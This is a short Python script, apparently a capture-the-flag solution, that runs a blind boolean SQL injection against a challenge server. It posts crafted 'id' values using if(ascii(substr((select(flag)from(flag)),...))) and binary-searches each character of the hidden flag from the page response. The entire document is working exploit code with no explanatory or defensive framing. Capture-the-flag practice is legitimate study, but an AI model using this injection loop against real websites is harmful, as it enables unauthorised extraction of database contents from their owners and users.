import requests
data={}
header={}
url="http://0654cc92-ed5b-484c-8f2e-f31bfe87fb01.node3.buuoj.cn/index.php"
payload="if(ascii(substr((select(flag)from(flag)),%d,1))=%d,1,2)"
result=""
for x in range(1,50):
    high=127
    low=32
    mid=(high+low)/2
    while high>low:
        payload="if(ascii(substr((select(flag)from(flag)),%d,1))>%d,1,2)"%(x,mid)
        data['id']=payload
        res=requests.post(url=url,data=data)
        if "Hello"in res.text:
            low=mid+1
        else:
            high=mid
        mid=(low+high)/2
    result+=chr(int(mid))
    print(result)